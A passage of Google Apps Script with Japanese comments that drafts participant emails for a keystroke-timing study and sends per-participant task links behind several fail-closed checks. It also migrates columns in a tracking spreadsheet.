    // ★★ 第 8 版（2026-08-04）: 課題文の本文を来所前に開示する（preregistration.md §2.12）。
    //    ⚠️ 本文そのものはメールに書かず、**別便の閲覧リンク**で渡す
    //       （sendTaskMaterialsEmail）。理由は 2 つ:
    //       (a) 登録時点ではまだ割付を作っていない（どの題材が出るか決まっていない）
    //       (b) ★ メール本文に題材名を書くと、書いた順序が **提示順** を示唆しうる。
    //          §2.12 は提示順を「開示しない」側に置いている。
    //    ⚠️ ★ **題材名をこのメール本文に書き戻さないこと。**
    //       scripts/check_g1_emails.py が両方のメールを同じ基準で検査する。
    // ★★ 2026-08-07 追加。⚠️ 受付メールにアプリのリンクが無く、被験者が自分で用意する術が
    //    無かった（在宅実施では致命的）。★ アプリは全員共通なので §2.12 に触れない。
    // ⚠️★★ 2026-08-08 訂正: ここは「**フォルダ**があります。丸ごと保存してください」と
    //   書いていたが、⚠️ **実際に置いてあるのは zip ファイル 2 つ**である。
    //   ★ しかも「フォルダを丸ごと保存」は **zip 配布に切り替えた理由そのもの**に反する:
    //     Drive はパーミッションを保存しないので、フォルダ経由で落とすと
    //     `.app` の実行ビットが落ちる (`make-common-app-zip.sh` の冒頭・実測済み)。
    //   ⚠️ ★ **展開の指示はメールにしか置けない。** README_先に読む.txt は zip の**中**にあり、
    //     展開する前の被験者には読めないからである。
    "■ アプリのご用意（★ 当日までにお願いします）",
    // ★ 短縮があれば短縮（無ければ生）。⚠️ 事前に shortenG1DistributionUrls() で作る。
    "    " + g1ShortOr_("G1_APP", G1_APP_DOWNLOAD_URL),
    "    ・「G1_実施用_Windows.zip」と「G1_実施用_macOS.zip」の 2 つがあります。",
    "      ★ **お使いのほうだけ**をダウンロードしてください（両方は要りません）。",
    "    ・★ ダウンロードしたら、**展開（解凍）してください**。",
    "        - macOS: ファイルをダブルクリックすると展開されます",
    "        - Windows: 右クリック →「すべて展開」",
    "      ⚠️ ★ **展開せずに中身を開かないでください。** そのままだと正しく動きません。",
    "    ・展開してできた「G1_実施用_…」フォルダは、★ **デスクトップなど分かりやすい場所に置き、",
    "      そのまま動かさないでください。**",
    "    ・そのあとは、macOS はフォルダ内の「README_先に読む.txt」、",
    "      Windows は同じフォルダの起動用ファイルに従ってください。",
    // ★★ 2026-08-08（preregistration.md 第 13 版 §2.14）: 実測で、macOS は
    //    「壊れているため開けません」を出し **被験者は自力で開けない**と判明した。
    //    ⚠️ 旧文は「早めにご自分で開いておいてください」と促しており、
    //       ★ **できないことを依頼していた**（開けずに不安にさせるだけだった）。
    //    → ★ 初回起動は研究者が同席して行う、に変える。
    "    ★★ **初回の起動は、研究者と一緒に行います**（対面または画面共有で 5 分ほど）。",
    "      ⚠️ ★ **ご自分で開こうとしても開けません。** 開けなくても故障ではありません。",
    "      macOS では「壊れているため開けません」と出ますが、★ **壊れていません。**",
    "      ⚠️ ★ **ゴミ箱に入れないでください。** 解除の操作は研究者が行います。",
    "      ★ ダウンロードと展開まで済ませたら、日程のご都合をお知らせください。",
    "      （2 回目からはダブルクリックだけで開きます）",
    "    ⚠️ この zip に課題のページは入っていません（課題のページは下記のとおり別にお渡しします）。",
    "",
  ]
    .concat(materialsBlock)
    .concat(g1FormRoutingBlock_(pid))
    .concat([
      "■ 課題について",
      // ★ 第 9 版（§2.14）: 在宅実施があるので「お越し」と書かない。
      "    ・専門知識は要りません。ふだんの生活の感覚で判断できる話題だけを使っています。",
      "    ・資料はすべて本実験のために作成した架空のものです。",
      "      ★ 数値・地名・調査結果は実在しません。外部で事実として引用しないでください。",
      "    ・課題文は当日も画面に表示されます。同じ画面で文章を書いていただきます。",
      "",
      "■ 記録するもの / しないもの",
      "    記録する: キーを押した時刻とキーの種類、日本語変換にかかった時間、書いた文字数、",
      "              ★ 1 分ごとの短い中断（30 秒未満）の回数と合計、アプリの版",
      "    記録しない: ★ どの文字を打ったか（本文）、画面の内容、音声・映像、",
      "                マウスの動きそのもの、端末を特定できる情報",
    // ⚠️ ★ 紙署名は 2026-08-03 に廃止した（D-1(a)）。このフォーム（G1-C）の回答が同意の正本である。
    //    ⚠️ ここを「署名をお願いします」に戻すと、protocol.md §4.1-1 / consent.md /
    //       Form_G1/README.md と食い違う。**4 か所を同時に直すこと。**
      "    ※ 書いた文章そのものは保存しません。ご同意はこのフォームの回答で完了しています。",
      "",
      "■ 当日までにお願いしたいこと",
      "    ・日本語入力（IME）は、ふだん使っている設定のままにしてください。",
      "    ・当日は携帯電話の電源を切ってください。",
      "",
      "■ 参加は任意です",
      "    途中でやめられます。理由の説明は要りません。終わった後でも記録の削除を求められます。",
      "",
      "ご不明な点があれば、このメールにご返信ください。",
      G1_CONTACT,
    ])
    .join("\n");
}

// ★ 送信前に内容を確認する（引数なし・送信しない）。
//
// ⚠️★★ 2026-08-08 に直した不具合: ここは `g1RegisterAckBody_("P0XX")` と **引数 1 つ**で
//   呼んでいたが、あの関数は `(pid, materialsUrl)` の **2 引数**である。
//   → `materialsUrl` が undefined → `hasMaterials=false` → ★ **常に「別便でお送りします」の
//     分岐しか表示されなかった**。⚠️ つまり **1 通運用の文面を一度もプレビューできていなかった**
//     （2026-08-08 に研究者が「課題文リンクが example.com になっている」と気づいて発覚）。
//   ★ プレビューは「本番と同じ物を見せる」ためにあるので、**実在するフォルダの URL を引いて**出す。
function previewRegisterAckEmail() {
  // ★ 実在する P-ID の URL を引く（用意済みなら本番とまったく同じ本文になる）。
  //   ⚠️ 引けなければ「まだ用意できていない」ということなので、★ それも見せる。
  var samplePid = "P015";
  if (PHASE1_MGMT_SHEET_ID) {
    try {
      var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
      var ids = roster ? g1RosterParticipantIds_(roster) : [];
      if (ids.length) samplePid = ids[ids.length - 1]; // ★ 直近の参加者で見る
    } catch (e) {
      Logger.log("⚠️ ロスターを読めないので P015 で代用します: " + e);
    }
  }
  var found = g1MaterialsUrlForPid_(samplePid);

  Logger.log("★★ 【1 通目】受付メール（登録直後に自動送信）— サンプル P-ID: " + samplePid);
  if (found.url) {
    Logger.log("★ この P-ID は用意できているので、**本番とまったく同じ本文**です。");
  } else {
    Logger.log("⚠️ この P-ID はまだ用意できていません（" + found.problem + "）");
    Logger.log("   → 下は**別便に落ちたとき**の本文です。★ 1 通運用の本文を見るには先に用意すること。");
  }
  Logger.log("件名: " + g1RegisterAckSubject_());
  Logger.log("--------");
  Logger.log(g1RegisterAckBody_(samplePid, found.url));
  Logger.log("--------");
  Logger.log("★ §2.12 の開示範囲と一致しているか確認（題材・課題の型・難易度を書かない）。");
  Logger.log("★ アプリのリンクが zip 2 個の置き場を指しているか: " + G1_APP_DOWNLOAD_URL);
  Logger.log("");

  // ⚠️★ 2 通目は **URL が実行時引数**なので、ここだけは本物を出せない。
  //   → プレースホルダだと**一目で分かる**書き方にする（example.com は「バグでは？」と読まれた）。
  Logger.log("★★ 【2 通目】事前資料メール（★ 1 通目で渡せなかったときだけの保険）");
  Logger.log("⚠️ 下の URL は **プレースホルダ**です（本番は sendTaskMaterialsEmail の引数で渡す実物）。");
  Logger.log("件名: " + g1MaterialsSubject_());
  Logger.log("--------");
  Logger.log(g1MaterialsBody_(samplePid, "《ここに実際のフォルダ URL が入ります／プレビューでは仮の文字列》"));
  Logger.log("--------");
  Logger.log("★ こちらも同じ基準（題材名・課題の型・条件名・提示順を書かない）。");
}

// ============================================================
// ★★ 課題ページの受け渡し（第 8 版で新設 → **第 11 版で事前開示を撤回**・2026-08-08）
// ============================================================
// ⚠️★ **第 11 版の訂正（2026-08-08）。** 第 8 版はここを「事前開示」と呼び、
//    「判定を緩める可能性のある変更」と記録していた。★ 第 11 版でそれを**撤回した**:
//    課題は事前に読むものではなく、**当日その場で取り掛かるもの**である。
//    ⚠️ ★ **撤回の向きは 1 つではない**（preregistration.md §2.12 第 11 版の表を見ること）:
//      (a) 操作チェックが「事前に読んだ記憶」でなく体験で答えられる = 妥当性が上がる
//      (b) HI–LO の差が縮まなくなる = **分離が出やすくなる = 判定を緩める側**
//    ⚠️ ★ ここは実装であって根拠ではない。文面を変えるときは §2.12 の表と突き合わせること。
//
// ⚠️ ★ **撤回しても「読めなくなった」わけではない。** 無人在宅では blockNN.html を
//    当日より前に手元へ渡すしかなく、ページの「課題を表示して始める」を押せば読める。
//    → **抑止であって保証ではない**。だから §2.12-3 / -4 / -6 は残してある。
//
// ⚠️⚠️ **自動化しない。** 送るのは研究者が明示的に実行したときだけである。理由:
//   (a) 登録時点では割付が無く、その被験者にどの題材が出るか決まっていない
//   (b) ★ 配布フォルダを作って共有する手作業（権限設定）が必ず挟まる
//   (c) 送信は取り消せない。⚠️ ★ **URL を取り違えると別の被験者の割付を渡すことになる**
//
// ⚠️ ★ **本文に題材名・課題の型・条件名・提示順を書かない。** 中身はリンク先にある。
//    scripts/check_g1_emails.py が受付メールと同じ基準で本文を検査する。

function g1MaterialsSubject_() {
  // ★★ 2026-08-08 改訂（§2.12 第 11 版）: 「事前資料」「お読みいただく」をやめた。
  //    ⚠️ 件名が「事前に読むもの」と名乗っていると、本文で撤回しても効かない。
  return "【課題ページ】キーボードの打ち方に関する研究 — 当日お使いいただくページ";
}

function g1MaterialsBody_(pid, url) {
  return [
    "当日お使いいただく課題ページをお送りします。",
    "",
    "■ 参加者ID（P-ID）",
    "    " + pid,
    "",
    // ⚠️★ 2026-08-07 訂正: ここは「閲覧のみ」と書いていたが、**実態と食い違っていた**。
    //    `§2.14`（第 9 版）で無人在宅を正規の実施形態にした時点で、被験者は blockNN.html を
    //    手元に持って自分で開く（`§2.13`）。★ 事実と違う案内をすると当日に詰まる。
    //    ⚠️ `§2.12` の「閲覧のみで開示する」という宣言との緊張は preregistration 側の論点であり、
    //       メールで取り繕う問題ではない（`§2.12` 自身も「防ぎ切ることを前提にしない」と書いている）。
    "■ あなた専用の課題ページ",
    "    " + url,
    "    1. このリンクを開き、block01.html … を **すべて** 保存してください。",
    // ⚠️★ 2026-08-08 訂正: 受付メールで案内するのは zip である。フォルダは展開後にできる。
    "    2. ★ 受付メールの zip を**展開してできた**「G1_実施用_…」フォルダの中へ、**まとめて移してください**。",
    "       （同じ場所に置いておくと、当日どれを開くか迷いません）",
    "    ⚠️ ★ **あなた専用です。** 他の方とは中身が違うので、共有しないでください。",
    "",
    // ★★ 2026-08-08 改訂（preregistration.md §2.12 第 11 版）: 事前開示を撤回した。
    //    ⚠️ 旧文は「目を通して構いません」と「開いて始めないでください」を並べていて、
    //       被験者から見て**どうすればよいか決まらなかった**（2026-08-08 に発見）。
    //    ★ ページ側にゲートを入れたので、**開くだけでは何も始まらない**と言い切れる。
    //    ⚠️ ★ ただし**押せば読める**（防ぎ切れない）。だからこそ §2.12-4 の設問は残す。
    "■ お願い",
    "    ★ 当日その場で開いて取り掛かっていただくものです。事前の準備は要りません。",
    "      ⚠️ **準備の量で評価することはありません。**",
    "    ★ 開いただけでは何も始まりません。ページの「課題を表示して始める」を押すと、",
    "      課題が表示され、そこから時間を計ります。★ **当日まで押さないでください。**",
    "    ・★ 間違って押してしまっても大丈夫です。ページを閉じて開き直せば元に戻ります。",
    "      ⚠️ その場合は、そのまま**当日にもう一度開き直して**ください。",
    "    ・当日は手元に印刷する必要はありません。画面だけで進みます。",
    "    ・終わったあとのアンケートで「当日より前に開いたか」を伺います。",
    "      ★ 正解はありません。**実験の判定には使いません。**",
    "",
    "■ 内容について",
    "    ・すべて本実験のために作成した架空のものです。",
    "      ★ 数値・地名・調査結果は実在しません。外部で事実として引用しないでください。",
    "    ・★ **他の方に見せないでください。** 同じ内容を他の参加者にもお願いしています。",
    "",
    "ご不明な点があれば、このメールにご返信ください。",
    G1_CONTACT,
  ].join("\n");
}

// 課題文の閲覧リンクを 1 人に送る。★ 研究者が閲覧専用ドキュメントを用意してから実行する。
//   使い方: sendTaskMaterialsEmail("P015", "xxx@example.com", "https://…")
function sendTaskMaterialsEmail(pid, email, url) {
  if (!G1_CONTACT) throw new Error("★ G1_CONTACT が空です。");
  if (!pid || !email || !url) {
    throw new Error("★ sendTaskMaterialsEmail(pid, email, url) の 3 つとも必要です。");
  }
  // ⚠️ ★ URL の取り違えは「別の被験者の割付を渡す」事故になる。最低限の形式検査をする。
  if (!/^https:\/\//.test(url)) {
    throw new Error("★ URL が https:// で始まっていません: " + url);
  }
  var subject = g1MaterialsSubject_();
  var body = g1MaterialsBody_(pid, url);
  if (G1_AUTO_SEND) {
    MailApp.sendEmail(email, subject, body);
    Logger.log("📧 事前資料メールを送信しました → " + g1MaskEmail_(email) + "（" + pid + "）");
  } else {
    GmailApp.createDraft(email, subject, body);
    Logger.log("📝 事前資料メールの下書きを作成しました → " + g1MaskEmail_(email));
    Logger.log("   ⚠️ ★ 下書きのままでは被験者に届きません。Gmail から送信してください。");
  }
  // 送った日を実施トラッキングに残す（★ URL 自体は書かない。割付が推測されうる）。
  try {
    var noteCell = g1EnsureRunRow_(pid);
    if (noteCell) {
      var sh = noteCell.getSheet();
      sh.getRange(noteCell.getRow(), runCol_("課題ページ送付日")).setValue(new Date());
    }
  } catch (e) {
    Logger.log("⚠️ 送信日を記録できませんでした（メールは送信済み）: " + e);
  }
}

// ============================================================
// ★★ 事前資料メールの自動送信（2026-08-07・decisions.md D-3）
// ============================================================
// ⚠️ ★ **なぜ「登録時に自動」ではなく「URL が貼られたら自動」なのか。**
//   登録時点では割付がまだ無く、その被験者にどの課題文が出るか決まっていない（§3-1）。
//   割付は seed を使う科学的な行為なので、梱包やメールのついでに走らせてはならない。
//   → ★ **研究者が配布フォルダの URL を貼った** ことを「割付が確定した」合図として使う。
//
// ⚠️⚠️ ★ **メール送信は取り消せない。** ガードを 4 本、fail-closed で置く:
//   1. キルスイッチ  … Script Properties G1_MATERIALS_AUTOSEND_OFF
//   2. URL 形式      … https://drive.google.com/ で始まること
//   3. 冪等          … 「課題ページ送付日」が空の行だけ
//   4. 1 回の上限    … G1_MATERIALS_MAX_PER_RUN 人まで（列の貼り間違いを頑健に抑える）
//
// ★ 本文 (g1MaterialsBody_) は**変えていない**。scripts/check_g1_emails.py の基準を跨がない。

/** ★ これを Script Properties に真値で置くと自動送信が止まる（値は何でもよい）。 */
var G1_AUTOSEND_OFF_PROP = "G1_MATERIALS_AUTOSEND_OFF";

/** ★ 1 回の発火で送る上限。⚠️ 0 にしないこと（0 は「無効」ではなく「1 人も送らない」）。 */
var G1_MATERIALS_MAX_PER_RUN = 3;

/** 配布フォルダ URL として受け付ける形。⚠️ ★ ここを緩めると別サイトの URL を配れてしまう。 */
var G1_MATERIALS_URL_RE = /^https:\/\/drive\.google\.com\/[^\s]+$/;

/**
 * ★★ 被験者別フォルダを束ねる**親**フォルダの ID（`G1_課題ページ_被験者別`）。
 *
 * ⚠️★★ **この親は「制限付き（非公開）」にしてある。** 2026-08-07 の判断:
 *   親を「リンクを知っている全員」にすると、★ 被験者へ送る URL を**親のほうにしてしまった
 *   1 回**で全被験者のフォルダ一覧が渡る（`preregistration.md §2.12`「他の被験者の割付」）。
 *   → 親を非公開にすると、同じ取り違えは「アクセス権が必要です」で**止まる**（fail-closed）。
 *   ★ 代わりに **被験者フォルダを 1 つずつ共有する**手作業が要る。その付け忘れは下の検査が拾う。
 */
var G1_MATERIALS_PARENT_ID = "1qhl28IDeh-19upuZf_YxPwwdq_d9xVcI";

/** Drive のフォルダ URL から ID を取り出す。取れなければ ""。 */
function g1FolderIdFromUrl_(url) {
  var m = String(url).match(/\/folders\/([A-Za-z0-9_-]+)/);
  return m ? m[1] : "";
}

/**
 * ★★ 配布フォルダの **実体** を確かめる（ガード 7）。問題が無ければ ""、あれば理由を返す。
 *
 * ⚠️ ★ 形式検査（ガード 2）は文字列しか見ない。ここは Drive に問い合わせて
 *    「**そのフォルダが本当にこの被験者のもので、本人が開けるか**」を見る。
 *    次の 4 つは、どれも形式検査を素通りする事故である:
 *      (a) 親フォルダの URL を貼った        → ★ 全被験者が見える
 *      (b) 別の被験者のフォルダの URL を貼った → ★ 割付を取り違えて渡す
 *      (c) 配布用の親の下に無いフォルダ       → 置き場所を間違えている
 *      (d) ★ **共有し忘れ**                 → 被験者はリンクを開けない（届いても使えない）
 *
 * ⚠️★ この関数のために **DriveApp のスコープが増える**。次回実行時に Apps Script が
 *    再承認を求めるので、⚠️ 研究者が「承認」を押すまで自動送信は走らない（安全側に倒れる）。
 */
function g1MaterialsFolderProblem_(url, pid) {
  var id = g1FolderIdFromUrl_(url);
  if (!id) return "URL からフォルダ ID を取り出せません（/folders/<ID> の形ではない）";
  if (G1_MATERIALS_PARENT_ID && id === G1_MATERIALS_PARENT_ID) {
    return "★★ これは被験者別フォルダの**親**の URL です（⚠️ 全被験者分が見えます）";
  }
  var folder;
  try {
    folder = DriveApp.getFolderById(id);
  } catch (e) {
    return "フォルダを開けません（ID 違い・削除済み・権限なし）: " + e;
  }
  // ★ 認める名前は `g1MaterialsFolderNames_` ただ 1 か所で決める（探す側と同じ集合）。
  //   ⚠️ 大文字小文字だけを吸収する。★ 前後の別語や部分一致は認めない。
  var name = String(folder.getName()).trim().toUpperCase();
  var allowed = g1MaterialsFolderNames_(pid).map(function (s) {
    return s.toUpperCase();
  });
  if (allowed.indexOf(name) < 0) {
    return (
      "フォルダ名が「" + folder.getName() + "」で P-ID と違います（★ 別の被験者の URL かも。" +
      "認める名前: " + g1MaterialsFolderNames_(pid).join(" / ") + "）"
    );
  }
  if (G1_MATERIALS_PARENT_ID) {
    var inParent = false;
    try {
      var ps = folder.getParents();
      while (ps.hasNext()) {
        if (ps.next().getId() === G1_MATERIALS_PARENT_ID) {
          inParent = true;
          break;
        }
      }
    } catch (e2) {
      return "親フォルダを確かめられません: " + e2;
    }
    if (!inParent) return "配布用の親フォルダ（G1_課題ページ_被験者別）の下にありません";
  }
  // ⚠️ ★ 共有し忘れの検出。親を非公開にした分、ここが**唯一の**受け皿である。
  var access;
  try {
    access = String(folder.getSharingAccess());
  } catch (e3) {
    return "共有設定を読めません: " + e3;
  }
  if (access !== "ANYONE_WITH_LINK" && access !== "ANYONE") {
    return (
      "★ まだ共有されていません（共有=" + access + "）。⚠️ このまま送っても被験者は開けません。" +
      "Drive で「リンクを知っている全員（閲覧者）」にしてください"
    );
  }
  return "";
}

/** 「G1 実施トラッキング」シートを返す。無ければ null（★ throw しない）。 */
function g1RunSheet_() {
  var ssId = PropertiesService.getScriptProperties().getProperty(MGMT_SHEET_PROP_G1);
  if (!ssId) return null;
  return SpreadsheetApp.openById(ssId).getSheetByName("G1 実施トラッキング") || null;
}

/**
 * ★★ 実シートに「配布フォルダURL」列を挿す（1 回だけ・冪等）。
 *
 * ⚠️ ★ **setupG1Forms() を実行してはならない**（フォームを作り直してしまう）。
 *    列を足すのはこの関数の仕事である。
 *
 * ⚠️ ★ なぜ「コードの RUN_HEADER を直すだけ」で済まないか:
 *    runCol_ は **コード側の RUN_HEADER しか見ない**。実シートが古いままだと、
 *    列名で引いているのに実シートでは**別の列**を指す。
 *    2026-08-03 に実際に起きている（16 列のシートへ 17 列の定義で入力規則を貼り、
 *    日付列「実施日」に「はい/いいえ」のドロップダウンが付いた）。
 *
 * ★ 列の「挿入」であって作り直しではないので、既存データも入力規則も右へずれて保たれる。
 */
function migrateRunSheetAddUrlColumn() {
  var sh = g1RunSheet_();
  if (!sh) {
    throw new Error("★ G1 管理シートが見つかりません（buildManagementSheet() を先に実行）。");
  }

  var NEW_COL = "配布フォルダURL";
  if (runHeaderDiff_(sh).length === 0) {
    Logger.log("✅ 既に「" + NEW_COL + "」列があります（何もしません）。");
    return;
  }

  // ★ 「新列を抜いたヘッダ」= 移行前に期待される姿。これと一致するときだけ触る。
  var idx = runCol_(NEW_COL); // 1 始まり
  var expectedOld = RUN_HEADER.slice(0, idx - 1).concat(RUN_HEADER.slice(idx));
  var live = sh.getRange(2, 1, 1, Math.max(sh.getLastColumn(), expectedOld.length)).getValues()[0];
  var mismatch = [];
  for (var i = 0; i < expectedOld.length; i++) {
    var a = String(expectedOld[i]);
    var b = String(live[i] === undefined ? "" : live[i]).trim();
    if (a !== b) mismatch.push("col" + (i + 1) + ": 期待='" + a + "' / シート='" + b + "'");
  }
  if (mismatch.length) {
    // ⚠️ ★ 見覚えのない形。黙って列を挿すと記録が 1 列ずれる。**止める。**
    throw new Error(
      "★ 「G1 実施トラッキング」が、移行前として期待する形と違います。\n" +
        "⚠️ このまま列を挿すと既存の記録が 1 列ずれます。中止しました。\n" +
        mismatch.join("\n") +
        "\n→ 列を手で合わせてから、もう一度この関数を実行してください。"
    );
  }

  sh.insertColumnBefore(idx);
  sh.getRange(2, idx).setValue(NEW_COL).setFontWeight("bold");
  sh.setColumnWidth(idx, 260);
  SpreadsheetApp.flush();

  assertRunHeader_(sh); // ★ 挿したあとに、コードと実シートが本当に一致したか確かめる
  Logger.log("✅ 「" + NEW_COL + "」列を " + idx + " 列目に挿しました。");
  Logger.log("★ 次: 被験者ごとに配布フォルダの URL をこの列に貼ると、自動で事前資料メールが出ます。");
  Logger.log("ℹ️ 自動送信を止めるには Script Properties に " + G1_AUTOSEND_OFF_PROP + " を置きます。");
}

/**
 * ★★ 実シートの列を第 13 版に合わせる（2026-08-08・**冪等**）。
 *
 * ⚠️ ★ **コードの RUN_HEADER を直すだけでは足りない。** `runCol_` は
 *    **コード側の配列しか見ない**ので、実シートが古いままだと**静かに別の列へ書く**
 *    （memory: `name-lookup-only-works-within-one-source` / 2026-08-03 に実際に起きた）。
 *
 * ⚠️ ★ **列は名前で引いて直す。** 位置で決め打ちすると、途中まで手で直されたシートを壊す。
 * ⚠️ ★ **削除する列の中身は、消す前に全部ログへ出す**（黙って捨てない）。
 *
 * 実行後に `assertRunHeader_` で**実シートとコードが本当に一致したか**を確かめ、
 * 入力規則と見た目を張り直す。
 */
var RUN_MIGRATION_RENAMES = [
  ["課題文リンク送信日", "課題ページ送付日"],
  ["GSE_DISABLE_PROBES=1", "G1モード確認"],
];
var RUN_MIGRATION_DROPS = ["実施予定日", "配置(A/B)"];
var RUN_MIGRATION_ADDS = [{ name: "配布URL(短縮)", after: "配布フォルダURL" }];
var RUN_MIGRATION_VALUES = [
  // ★ 第 13 版で実施形態の言い方を変えた。★ 既存行の値も揃える（選択肢だけ変えると宙に浮く）。
  { col: "実施形態", from: "無人在宅", to: "在宅（初回起動のみ同席）" },
];

function migrateRunSheetToV14() {
  var sh = g1RunSheet_();
  if (!sh) {
    throw new Error("★ G1 管理シートが見つかりません（buildManagementSheet() を先に実行）。");
  }
  function header() {
    var w = Math.max(sh.getLastColumn(), RUN_HEADER.length);
    return sh.getRange(2, 1, 1, w).getValues()[0].map(function (v) {
      return String(v === undefined || v === null ? "" : v).trim();
    });
  }
  if (runHeaderDiff_(sh).length === 0 && sh.getLastColumn() === RUN_HEADER.length) {
    Logger.log("✅ 実シートは既に最新の列構成です（何もしません）。見た目だけ張り直します。");
    styleRunTab_(sh);
    applyRunValidation_(sh.getParent());
    return;
  }
  var lastRow = sh.getLastRow();
  var nData = Math.max(lastRow - 2, 0);
  var changed = [];

  // 1) 改名（★ 中身は動かさない）
  RUN_MIGRATION_RENAMES.forEach(function (pair) {
    var h = header();
    var i = h.indexOf(pair[0]);
    if (i >= 0) {
      sh.getRange(2, i + 1).setValue(pair[1]);
      changed.push("改名: " + pair[0] + " → " + pair[1] + "（col" + (i + 1) + "）");
    } else if (h.indexOf(pair[1]) < 0) {
      Logger.log("⚠️ 旧名も新名も見つかりません: " + pair[0] + " / " + pair[1]);
    }
  });

  // 2) 削除（⚠️ ★ 消す前に中身をログに出す）
  RUN_MIGRATION_DROPS.forEach(function (name) {
    var i = header().indexOf(name);
    if (i < 0) return;
    if (nData > 0) {
      var vals = sh.getRange(3, i + 1, nData, 1).getValues().map(function (r) {
        return String(r[0] === undefined || r[0] === null ? "" : r[0]).trim();
      });
      var nonEmpty = vals.filter(function (v) { return v !== ""; });
      Logger.log(
        "🗑 「" + name + "」を削除します。★ 消える値 " + nonEmpty.length + " 件: " +
          (nonEmpty.length ? nonEmpty.join(" / ") : "（すべて空）")
      );
    }
    sh.deleteColumn(i + 1);
    changed.push("削除: " + name);
  });

  // 3) 追加（★ 左隣の列名の右へ挿す）
  RUN_MIGRATION_ADDS.forEach(function (add) {
    var h = header();
    if (h.indexOf(add.name) >= 0) return;
    var i = h.indexOf(add.after);
    if (i < 0) {
      Logger.log("⚠️ 「" + add.after + "」が無いので「" + add.name + "」を足せません。");
      return;
    }
    sh.insertColumnAfter(i + 1);
    sh.getRange(2, i + 2).setValue(add.name);
    changed.push("追加: " + add.name + "（col" + (i + 2) + "）");
  });

  // 4) 値の言い換え
  RUN_MIGRATION_VALUES.forEach(function (v) {
    var i = header().indexOf(v.col);
    if (i < 0 || nData <= 0) return;
    var range = sh.getRange(3, i + 1, nData, 1);
    var vals = range.getValues();
    var hit = 0;
    for (var r = 0; r < vals.length; r++) {
      if (String(vals[r][0]).trim() === v.from) {
        vals[r][0] = v.to;
        hit++;
      }
    }
    if (hit) {
      range.setValues(vals);
      changed.push("値: " + v.col + " の「" + v.from + "」" + hit + " 件 → 「" + v.to + "」");
    }
  });

  SpreadsheetApp.flush();

  // ⚠️ ★ 余った列を見落とさない（runHeaderDiff_ は RUN_HEADER の長さまでしか見ない）。
  if (sh.getLastColumn() > RUN_HEADER.length) {
    var extra = sh
      .getRange(2, RUN_HEADER.length + 1, 1, sh.getLastColumn() - RUN_HEADER.length)
      .getValues()[0]
      .filter(function (v) { return String(v).trim() !== ""; });
    if (extra.length) {
      Logger.log("⚠️ ★ 右側に見覚えのない列が残っています: " + extra.join(" / ") +
        "（★ 研究者が足した列なら残して構いませんが、位置に依存する処理はありません）");
    }
  }

  // ★ ここで初めて「コードと実シートが一致したか」を確かめる。ずれていれば例外で止まる。
  assertRunHeader_(sh);
  // ⚠️★ 見た目で落ちても**入力規則までは必ず張る**（列の移行が中途半端に見えるのを防ぐ）。
  //   2026-08-08 に実際に踏んだ: styleRunTab_ の setFrozenColumns が例外を投げ、
  //   ★ 列は直っているのに規則が張られないまま終わった。
  try {
    styleRunTab_(sh);
  } catch (e) {
    Logger.log("⚠️ ★ 見た目の設定で失敗しました（列の移行は完了しています）: " + e);
  }
  applyRunValidation_(sh.getParent());

  Logger.log(changed.length ? "✅ 移行しました:\n· " + changed.join("\n· ") : "✅ 変更はありません。");
  Logger.log("★ 次: refreshG1RunSheet() を 1 回実行すると「配布URL(短縮)」が埋まります。");
}

/** P-ID から Phase1 ロスターのメールを引く。見つからなければ ""。 */
function g1EmailForPid_(pid) {
  if (!PHASE1_MGMT_SHEET_ID) return "";
  var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
  if (!roster) return "";
  var found = g1FindInPhase1Roster_(roster, { pid: pid });
  if (!found) return "";
  return String(roster.getRange(found.row, 3).getValue()).trim();
}

/**
 * 送信対象を集める（★ 送らない）。g1AutoSendPendingMaterials と previewPendingTaskMaterials で共有する。
 * ⚠️ ★ 「なぜ送らないか」を必ず理由付きで返す。黙って飛ばすと、研究者は
 *    「URL は貼ったのに永久に届かない」状態に気づけない。
 */
function g1CollectPendingMaterials_() {
  var sh = g1RunSheet_();
  if (!sh) return { rows: [], skipped: [], error: "G1 管理シートが見つかりません" };
  try {
    assertRunHeader_(sh);
  } catch (e) {
    return { rows: [], skipped: [], error: String(e.message).split("\n")[0] };
  }

  var colPid = runCol_("P-ID");
  var colUrl = runCol_("配布フォルダURL");
  var colSent = runCol_("課題ページ送付日");
  var last = sh.getLastRow();
  var rows = [];
  var skipped = [];

  // --- 1 周目: ★ URL の重複を数える（送信済みの行も含める） ---------------------
  // ⚠️★★ 形式検査 (ガード 2) は「Drive の URL か」しか見ない。**宛先が正しいか**は見ない。
  //   実際に起こる事故は「別の被験者の URL を貼る」「1 人ぶんを複数行にコピペする」であり、
  //   どちらも形式検査を素通りする。★ 同じ URL が 2 人以上に紐づいていたら **貼り間違い**なので、
  //   自動では送らず人に返す（送信は取り消せないので、疑わしいときは送らない側に倒す）。
  //   ★ 送信済みの行も数に入れる: 既に P015 へ送った URL を P016 に貼る事故を捕まえるため。
  var pidsByUrl = {};
  for (var r0 = 3; r0 <= last; r0++) {
    var p0 = String(sh.getRange(r0, colPid).getValue()).trim().toUpperCase();
    var u0 = String(sh.getRange(r0, colUrl).getValue()).trim();
    if (!p0 || !u0) continue;
    if (!pidsByUrl[u0]) pidsByUrl[u0] = [];
    if (pidsByUrl[u0].indexOf(p0) < 0) pidsByUrl[u0].push(p0);
  }

  // --- 2 周目: 送る相手を決める -------------------------------------------------
  for (var r = 3; r <= last; r++) {
    var pid = String(sh.getRange(r, colPid).getValue()).trim().toUpperCase();
    if (!pid) continue;
    var url = String(sh.getRange(r, colUrl).getValue()).trim();
    var sent = sh.getRange(r, colSent).getValue();

    if (sent !== "" && sent !== null && sent !== undefined) continue; // ガード 3: 冪等（静かでよい）
    if (!url) continue; // まだ配布フォルダを作っていない = 正常な待ち状態
    if (!G1_MATERIALS_URL_RE.test(url)) {
      skipped.push(pid + ": URL が https://drive.google.com/ で始まっていません"); // ガード 2
      continue;
    }
    if (pidsByUrl[url] && pidsByUrl[url].length > 1) {
      // ガード 5: ★ 同じ URL が複数の P-ID に紐づいている = 貼り間違い
      skipped.push(
        pid + ": 同じ URL が " + pidsByUrl[url].join(" / ") + " に貼られています" +
          "（★ 貼り間違いの可能性。人が直してから送ってください）"
      );
      continue;
    }
    var email = g1EmailForPid_(pid);
    if (!email) {
      skipped.push(pid + ": Phase1 ロスターにメールがありません");
      continue;
    }
    // ガード 7: ★ Drive に問い合わせて実体を確かめる（親の URL / 別人 / 共有し忘れ）
